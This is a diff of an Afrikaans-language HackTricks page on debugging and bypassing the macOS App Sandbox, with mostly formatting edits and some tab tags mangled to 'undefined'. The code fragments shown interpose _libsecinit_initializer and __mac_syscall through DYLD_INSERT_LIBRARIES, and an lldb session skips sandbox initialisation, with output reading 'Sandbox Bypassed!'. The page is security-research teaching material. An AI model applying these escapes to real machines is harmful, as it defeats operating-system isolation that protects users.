@@ -1,4 +1,4 @@
-# macOS Sandboks Debuut & Omspring
+# macOS Sandbox Debug & Bypass
 
 <details>
 
@@ -9,7 +9,7 @@ Ander maniere om HackTricks te ondersteun:
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
@@ -77,18 +77,21 @@ As jy vanuit die sandboksproses in staat is om **ander prosesse** wat in minder 
 [**Hierdie navorsing**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) het 2 maniere ontdek om die Sandboks te omseil. Omdat die sandboks vanuit die gebruikersruimte toegepas word wanneer die **libSystem**-biblioteek gelaai word. As 'n binêre lêer dit kan vermy om dit te laai, sal dit nooit geïsoleer word nie:
 
 * As die binêre lêer **volledig staties gekompileer** is, kan dit vermy om daardie biblioteek te laai.
-* As die **binêre lêer nie enige biblioteke hoef te laai** nie (omdat die skakelaar ook in libSystem is), sal dit nie libSystem hoef te laai nie.&#x20;
+* As die **binêre lêer nie enige biblioteke hoef te laai** nie (omdat die skakelaar ook in libSystem is), sal dit nie libSystem hoef te laai nie.
 
 ### Skulpkodes
 
 Let daarop dat **selfs skulpkodes** in ARM64 gekoppel moet word aan `libSystem.dylib`:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Toekennings
 
 Let daarop dat selfs al mag sommige **aksies toegelaat word deur die sandboks**, as 'n toepassing 'n spesifieke **toekennings** het, soos in:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ Let daarop dat selfs al mag sommige **aksies toegelaat word deur die sandboks**,
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Interposting Bypass
 
 Vir meer inligting oor **Interposting**, kyk:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Interposteer `_libsecinit_initializer` om die sandkas te voorkom
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Interposteer `__mac_syscall` om die Sandboks te voorkom
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,20 +183,22 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Foutopsporing en omseiling van Sandboks met lldb
 
 Laten ons 'n toepassing saamstel wat gesandboks moet word:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
-{% tab title="entitlements.xml" %}
+{% endtab %}
 
+{% tab title="entitlements.xml" %}
 Hierdie lêer bevat die toestemmings wat aan 'n toepassing in die macOS-sandbox toegeken word. Die toestemmings bepaal watter hulpbronne en funksies die toepassing mag gebruik. Hierdie lêer kan aangepas word om sekere beperkings te omseil en toegang tot beperkte hulpbronne te verkry.
 
 Die inhoud van die lêer moet in XML-formaat wees en spesifieke sleutels en waardes moet ingesluit word om die toestemmings te definieer. Hier is 'n voorbeeld van hoe die lêer lyk:
@@ -212,8 +221,9 @@ Die inhoud van die lêer moet in XML-formaat wees en spesifieke sleutels en waar
 In hierdie voorbeeld word drie toestemmings toegeken aan die toepassing: `com.apple.security.app-sandbox`, `com.apple.security.network.client`, en `com.apple.security.files.user-selected.read-write`. Die waardes van hierdie sleutels is `true`, wat beteken dat die toepassing toegang het tot die betrokke hulpbronne.
 
 Dit is belangrik om op te let dat die aanpassing van hierdie lêer 'n potensiële veiligheidsrisiko kan skep, aangesien dit die beperkings van die sandbox omseil. Dit moet slegs gedoen word as dit absoluut noodsaaklik is en met groot omsigtigheid.
-
 {% endtab %}
+
+{% tab title="undefined" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -222,6 +232,8 @@ Dit is belangrik om op te let dat die aanpassing van hierdie lêer 'n potensiël
 </dict>
 </plist>
 ```
+{% endtab %}
+
 {% tab title="Info.plist" %}
 ```xml
 <plist version="1.0">
@@ -253,12 +265,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Die app sal probeer om die lêer **`~/Desktop/del.txt`** te **lees**, wat die **Sandbox nie sal toelaat nie**.\
 Skep 'n lêer daar aangesien, sodra die Sandbox omseil is, sal dit in staat wees om dit te lees:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Laat ons die toepassing ontleed om te sien wanneer die Sandboks gelaai word:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -335,6 +349,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Selfs met die omseiling van die Sandboks, sal TCC** die gebruiker vra of hy die proses wil toelaat om lêers vanaf die lessenaar te lees.
 {% endhint %}
@@ -354,7 +369,7 @@ Ander maniere om HackTricks te ondersteun:
 * As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
